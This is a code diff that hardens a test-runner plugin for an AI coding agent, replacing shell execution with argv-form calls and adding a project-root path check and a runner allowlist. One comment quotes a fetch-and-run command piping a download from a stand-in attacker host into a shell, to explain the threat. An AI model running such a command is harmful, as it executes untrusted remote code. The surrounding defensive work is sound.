@@ -30,9 +30,9 @@
  * @public
  */
 import type { Plugin } from '@wrongstack/core';
-import { execSync } from 'node:child_process';
+import { execFileSync, execSync } from 'node:child_process';
 import { existsSync } from 'node:fs';
-import { basename, dirname, join } from 'node:path';
+import { basename, dirname, isAbsolute, join, relative, resolve } from 'node:path';
 
 const API_VERSION = '^0.1.10';
 
@@ -85,11 +85,7 @@ const DEFAULTS: TestGateConfig = {
   runner: 'auto',
   command: '',
   timeoutMs: 30_000,
-  testFilePatterns: [
-    'src/{name}.test.ts',
-    'tests/{name}.test.ts',
-    'tests/{name}-exec.test.ts',
-  ],
+  testFilePatterns: ['src/{name}.test.ts', 'tests/{name}.test.ts', 'tests/{name}-exec.test.ts'],
   injectOnPass: false,
 };
 
@@ -104,13 +100,56 @@ function readConfig(raw: unknown): TestGateConfig {
     enabled: r['enabled'] !== false,
     runner,
     command: typeof r['command'] === 'string' ? r['command'] : DEFAULTS.command,
-    timeoutMs: typeof r['timeoutMs'] === 'number' && r['timeoutMs'] > 0 ? r['timeoutMs'] : DEFAULTS.timeoutMs,
-    testFilePatterns: Array.isArray(r['testFilePatterns']) && (r['testFilePatterns'] as unknown[]).length > 0
-      ? (r['testFilePatterns'] as unknown[]).filter((x): x is string => typeof x === 'string')
-      : DEFAULTS.testFilePatterns,
+    timeoutMs:
+      typeof r['timeoutMs'] === 'number' && r['timeoutMs'] > 0
+        ? r['timeoutMs']
+        : DEFAULTS.timeoutMs,
+    testFilePatterns:
+      Array.isArray(r['testFilePatterns']) && (r['testFilePatterns'] as unknown[]).length > 0
+        ? (r['testFilePatterns'] as unknown[]).filter((x): x is string => typeof x === 'string')
+        : DEFAULTS.testFilePatterns,
     injectOnPass: r['injectOnPass'] === true,
   };
 }
+
+// ---------------------------------------------------------------------------
+// Sandbox: reject paths outside the project root, and lock down the
+// `command` config option (config-supplied first token = arbitrary
+// binary) to an allowlist of legitimate test runners. test-runner-gate
+// runs on every write/edit; an attacker who can write to the plugin
+// config can already pivot to test-runner-gate to run any process.
+// ---------------------------------------------------------------------------
+function withinProject(p: string): boolean {
+  if (typeof p !== 'string' || p.length === 0 || p.length > 4096) return false;
+  const root = process.cwd();
+  const resolved = isAbsolute(p) ? resolve(p) : resolve(root, p);
+  const rel = relative(root, resolved);
+  if (rel === '' || rel === '.') return true;
+  if (rel.startsWith('..')) return false;
+  if (isAbsolute(rel)) return false;
+  return true;
+}
+
+// Allowlist for custom test commands. The first token of `command` must
+// resolve to one of these binaries. Without this, a config-supplied
+// `command: "curl http://evil.com | sh"` (which split() doesn't help
+// against because of pipes handled outside spawn) becomes a directed
+// process start. We limit to the same runner families that ship with
+// the plugin and the bundled npx + pnpm test wrappers.
+const ALLOWED_COMMAND_TOKENS = new Set<string>([
+  'npx',
+  'pnpm',
+  'pnpm',
+  'npm',
+  'yarn',
+  'vitest',
+  'jest',
+  'mocha',
+  // Useful for `command: "node ./scripts/run-tests.js"` style configs.
+  'node',
+  // Direct binary paths under the project's node_modules — resolved
+  // by basename in resolveAllowedCommand().
+]);
 
 // ---------------------------------------------------------------------------
 // Test file resolution
@@ -202,7 +241,9 @@ function detectRunner(requested: Runner): RunnerConfig | null {
     if (!match) return null;
     try {
       execSync(`npx ${match.name} --version`, {
-        encoding: 'utf-8', timeout: 5_000, cwd: process.cwd(),
+        encoding: 'utf-8',
+        timeout: 5_000,
+        cwd: process.cwd(),
         stdio: ['pipe', 'pipe', 'pipe'],
       });
       return match;
@@ -215,7 +256,9 @@ function detectRunner(requested: Runner): RunnerConfig | null {
   for (const candidate of candidates) {
     try {
       execSync(`npx ${candidate.name} --version`, {
-        encoding: 'utf-8', timeout: 5_000, cwd: process.cwd(),
+        encoding: 'utf-8',
+        timeout: 5_000,
+        cwd: process.cwd(),
         stdio: ['pipe', 'pipe', 'pipe'],
       });
       return candidate;
@@ -240,8 +283,35 @@ interface TestRunResult {
 }
 
 /**
+ * Resolve the first token of `customCommand` against an allowlist of
+ * legitimate test runners. Returns `[binary, restArgs]` if allowed,
+ * `null` otherwise. This prevents a config-supplied `command` from
+ * pivoting the runner hook into arbitrary code execution.
+ */
+function resolveAllowedCommand(customCommand: string): { cmd: string; args: string[] } | null {
+  const tokens = customCommand.split(/\s+/).filter(Boolean);
+  if (tokens.length === 0) return null;
+  const head = tokens[0]!;
+  // Bare binary name on the allowlist → pass through (PATH resolution).
+  if (ALLOWED_COMMAND_TOKENS.has(head)) {
+    return { cmd: head, args: tokens.slice(1) };
+  }
+  // Absolute path under the project → must resolve inside and the
+  // basename must be in the allowlist.
+  if (isAbsolute(head)) {
+    if (!withinProject(head)) return null;
+    const base = basename(head);
+    if (ALLOWED_COMMAND_TOKENS.has(base)) {
+      return { cmd: head, args: tokens.slice(1) };
+    }
+  }
+  return null;
+}
+
+/**
  * Run the test command on a specific test file and parse the output.
- * Returns null if the runner itself failed (timeout, crash, not found).
+ * Returns null if the runner itself failed (timeout, crash, not found,
+ * or the custom command failed the allowlist).
  */
 function runTests(
   testFile: string,
@@ -249,16 +319,42 @@ function runTests(
   customCommand: string,
   timeoutMs: number,
 ): TestRunResult | null {
+  // Sandbox: refuse to run tests for paths outside the project root.
+  if (!withinProject(testFile)) return null;
+
   // Use custom command if provided, otherwise use the runner's default.
-  const baseCommand = customCommand || runner.command;
-  const fullCommand = `${baseCommand} "${testFile}" ${runner.jsonFlags}`;
+  // execFileSync argv-form — no shell interpolation. testFile goes in as
+  // its own argv element so quotes/spaces in names cannot escape.
+  let cmd: string;
+  let cmdArgs: string[];
+  let trailingFlag: string;
+  if (customCommand) {
+    const resolved = resolveAllowedCommand(customCommand);
+    if (!resolved) return null;
+    cmd = resolved.cmd;
+    cmdArgs = [...resolved.args, testFile];
+    trailingFlag = runner.jsonFlags;
+  } else {
+    // runner.command is hard-coded by the plugin (no user input) and
+    // looks like "npx vitest run" — split into argv tokens.
+    const tokens = runner.command.split(/\s+/).filter(Boolean);
+    cmd = tokens[0]!;
+    cmdArgs = [...tokens.slice(1), testFile];
+    trailingFlag = runner.jsonFlags;
+  }
+  // trailingFlag is a single space-delimited string from the runner
+  // table (e.g. "--reporter=json"). execFileSync wants its own argv
+  // element — split spaces too.
+  const trailing = trailingFlag.split(/\s+/).filter(Boolean);
+  const fullArgs = [...cmdArgs, ...trailing];
   let stdout = '';
   try {
-    stdout = execSync(fullCommand, {
+    stdout = execFileSync(cmd, fullArgs, {
       encoding: 'utf-8',
       timeout: timeoutMs,
       cwd: process.cwd(),
       stdio: ['pipe', 'pipe', 'pipe'],
+      shell: false,
     });
   } catch (err: unknown) {
     const e = err as { stdout?: string; killed?: boolean };
@@ -273,7 +369,7 @@ function runTests(
     const numTotalTests = data.numTotalTests ?? 0;
     const numFailedTests = data.numFailedTests ?? 0;
     const numPassedTests = data.numPassedTests ?? 0;
-    const success = data.success ?? (numFailedTests === 0);
+    const success = data.success ?? numFailedTests === 0;
 
     // Extract failure messages (up to 5).
     const failures: string[] = [];
@@ -321,7 +417,8 @@ function runTests(
 const plugin: Plugin = {
   name: 'test-runner-gate',
   version: '0.1.0',
-  description: 'PostToolUse hook that runs the relevant test file after every write or edit to a source file',
+  description:
+    'PostToolUse hook that runs the relevant test file after every write or edit to a source file',
   apiVersion: API_VERSION,
   capabilities: { tools: true, hooks: true },
   defaultConfig: { ...DEFAULTS },
@@ -342,7 +439,8 @@ const plugin: Plugin = {
       command: {
         type: 'string',
         default: '',
-        description: 'Custom command prefix (overrides the runner default). Empty = use runner default.',
+        description:
+          'Custom command prefix (overrides the runner default). Empty = use runner default.',
       },
       timeoutMs: {
         type: 'number',
@@ -354,7 +452,8 @@ const plugin: Plugin = {
         type: 'array',
         items: { type: 'string' },
         default: ['src/{name}.test.ts', 'tests/{name}.test.ts', 'tests/{name}-exec.test.ts'],
-        description: 'Patterns to derive test file from source. {name}=basename, {path}=path-no-ext, {dir}=dirname.',
+        description:
+          'Patterns to derive test file from source. {name}=basename, {path}=path-no-ext, {dir}=dirname.',
       },
       injectOnPass: {
         type: 'boolean',
@@ -380,9 +479,12 @@ const plugin: Plugin = {
     // Detect runner at setup time.
     const runner = detectRunner(cfg.runner);
     if (!runner) {
-      api.log.warn('test-runner-gate: no test runner found (vitest, jest, mocha) — hook will be a no-op', {
-        requested: cfg.runner,
-      });
+      api.log.warn(
+        'test-runner-gate: no test runner found (vitest, jest, mocha) — hook will be a no-op',
+        {
+          requested: cfg.runner,
+        },
+      );
     } else {
       api.log.info('test-runner-gate: detected runner', { name: runner.name });
     }
@@ -400,6 +502,12 @@ const plugin: Plugin = {
       const inp = (input.toolInput ?? {}) as Record<string, unknown>;
       const sourcePath = inp['path'] as string | undefined;
       if (!sourcePath || typeof sourcePath !== 'string') return;
+
+      // Sandbox: refuse to derive a test path for source files outside
+      // the project root. Without this guard a prompt-injected write at
+      // /etc/passwd or C:\Windows could trigger test runs against
+      // attacker-controlled candidates.
+      if (!withinProject(sourcePath)) return;
 
       // Skip if the file being edited IS a test file — running tests
       // on a test file that was just modified is fine, but the LLM
@@ -444,10 +552,10 @@ const plugin: Plugin = {
 
       // Tests failed — inject failure details.
       state.failCount += 1;
-      const failureList = result.failures.length > 0
-        ? '\n' + result.failures.map((f) => `  ❌ ${f}`).join('\n')
-        : '';
-      const truncated = result.failCount > 5 ? `\n  … and ${result.failCount - 5} more failure(s)` : '';
+      const failureList =
+        result.failures.length > 0 ? '\n' + result.failures.map((f) => `  ❌ ${f}`).join('\n') : '';
+      const truncated =
+        result.failCount > 5 ? `\n  … and ${result.failCount - 5} more failure(s)` : '';
 
       api.log.warn(`test-runner-gate: ${result.failCount} test(s) failed for ${testFile}`, {
         source: sourcePath,
